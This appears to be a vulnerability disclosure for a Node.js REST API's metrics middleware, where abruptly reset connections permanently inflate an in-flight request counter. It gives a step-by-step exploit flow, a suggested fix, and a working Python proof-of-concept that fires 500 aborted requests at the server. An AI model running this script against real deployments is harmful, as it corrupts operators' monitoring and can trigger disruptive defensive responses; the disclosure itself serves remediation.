### Title
Permanent `inFlightCounter` Inflation via Abrupt Client Disconnection (Missing `close` Event Handler)

### Summary
In `rest/middleware/metricsHandler.js`, the `metricsMiddleware()` function increments `inFlightCounter` (`api_all_request_in_processing_total`) on every incoming request but only decrements it inside a `res.on('finish', ...)` handler. In Node.js HTTP, the `finish` event is **not** emitted when the underlying TCP connection is destroyed before the server calls `res.end()`. An unprivileged attacker who sends a valid request and immediately resets the TCP connection causes the counter to be permanently incremented with no corresponding decrement, inflating the metric indefinitely.

### Finding Description
**Exact code path:**

`rest/middleware/metricsHandler.js`, function `metricsMiddleware()`:

- **Line 169**: `inFlightCounter.add(1)` — fires unconditionally for every non-metrics request, immediately after the middleware is entered.
- **Lines 185–186**: `res.on('finish', () => { inFlightCounter.add(-1); ... })` — the **only** place the counter is decremented.

**Root cause:**

Node.js `http.ServerResponse` inherits from `stream.Writable`. The `finish` event fires when `res.end()` has been called and all data has been flushed to the OS kernel. The `close` event fires when the underlying socket is destroyed — which can happen *before* `res.end()` is ever called (e.g., when the client sends a TCP RST immediately after the request). In that case, `finish` is **never emitted**, but `close` is. Because the code registers only a `finish` listener and no `close` listener, the `inFlightCounter.add(-1)` call is skipped entirely.

**Failed assumption:** The code assumes `finish` is always eventually emitted for every request that enters the middleware. This is false for abruptly-disconnected clients.

**Exploit flow:**
1. Attacker opens a TCP connection to the REST API server.
2. Sends a syntactically valid HTTP request: `GET /api/v1/transactions HTTP/1.1\r\nHost: target\r\n\r\n`.
3. Immediately sends a TCP RST (or calls `socket.destroy()` in a script) to tear down the connection before the server responds.
4. The server's Express stack has already entered `metricsMiddleware`, executed `inFlightCounter.add(1)` (line 169), and registered the `finish` listener (line 185).
5. The server begins processing (e.g., issues a DB query for transactions).
6. When the server attempts to write the response, the socket is already destroyed; `res.end()` either errors or is a no-op on the destroyed socket. `finish` is never emitted.
7. `inFlightCounter.add(-1)` is never called. The counter is permanently +1.
8. Repeat in a tight loop from multiple source IPs or with connection pooling.

**Why existing checks are insufficient:**

- The REST API (`/api/v1/transactions`) requires **no authentication**; any anonymous client can trigger this.
- The rate-limiting code in the repository (`ThrottleManagerImpl`, `ThrottleConfiguration`) applies only to the **web3 Java service**, not to the Node.js REST API.
- The Traefik `inFlightReq`/`rateLimit` middleware in `charts/hedera-mirror-rosetta/values.yaml` is infrastructure-level, optional, and scoped to the Rosetta service — not the REST API.
- There is no per-IP connection limit or request-abort detection anywhere in `metricsHandler.js` or `server.js`.

### Impact Explanation
The `api_all_request_in_processing_total` metric is displayed in the Grafana dashboard (`charts/hedera-mirror-common/dashboards/hedera-mirror-rest.json`) with a red threshold at 50. An attacker sending ~100 aborted requests permanently pins this gauge above the alert threshold. Operators observing a sustained "Requests Processing" spike may:
- Activate rate limiting or circuit breakers that restrict legitimate access to `/api/v1/transactions`
- Trigger incident response procedures
- Misattribute the spike as a real traffic surge and reorganize access controls

The metric is an `UpDownCounter` (not a gauge that resets), so the inflation persists across scrape intervals until the process restarts. This constitutes a low-cost, persistent denial-of-observability and potential denial-of-service via operator-triggered defensive actions.

### Likelihood Explanation
- **No privileges required**: the `/api/v1/transactions` endpoint is public.
- **Trivially scriptable**: a single Python/Node script using raw sockets or `curl --max-time 0` with immediate kill can generate thousands of aborted requests per minute.
- **Repeatable and persistent**: each aborted request permanently increments the counter; the effect accumulates and does not self-heal.
- **Low detectability**: the attacker's requests look like normal GET requests in access logs; only the TCP RST distinguishes them, which is not logged by default.

### Recommendation
Register a `close` handler alongside `finish`, using a one-shot guard to prevent double-decrement:

```js
// rest/middleware/metricsHandler.js  ~line 185
let settled = false;
const onFinalize = () => {
  if (settled) return;
  settled = true;
  inFlightCounter.add(-1);
  // ... rest of metrics recording
};

res.on('finish', onFinalize);
res.on('close',  onFinalize);  // fires when socket is destroyed before finish
```

This ensures `inFlightCounter` is always decremented regardless of whether the client disconnected before the response was sent.

### Proof of Concept
```bash
# Requires: bash, python3, netcat or python socket
python3 - <<'EOF'
import socket, time, threading

TARGET_HOST = "mirror-node-rest"  # replace with actual host
TARGET_PORT = 5551                # default REST port

def aborted_request():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((TARGET_HOST, TARGET_PORT))
    # Send a complete, valid HTTP request
    s.sendall(b"GET /api/v1/transactions HTTP/1.1\r\nHost: mirror-node-rest\r\nConnection: close\r\n\r\n")
    # Immediately destroy the socket (RST) before server responds
    s.setsockopt(socket.SOL_SOCKET, socket.SO_LINGER, b'\x01\x00\x00\x00\x00\x00\x00\x00')
    s.close()  # sends RST

threads = [threading.Thread(target=aborted_request) for _ in range(500)]
for t in threads: t.start()
for t in threads: t.join()

print("Done. Check api_all_request_in_processing_total — it should now be permanently elevated.")
EOF
```

After running, query the metrics endpoint:
```
curl http://mirror-node-rest:5551/swagger/metrics/ | grep api_all_request_in_processing_total
```
The value will be permanently elevated by ~500 (minus any requests that completed before the RST was processed), and will not decrease until the process restarts.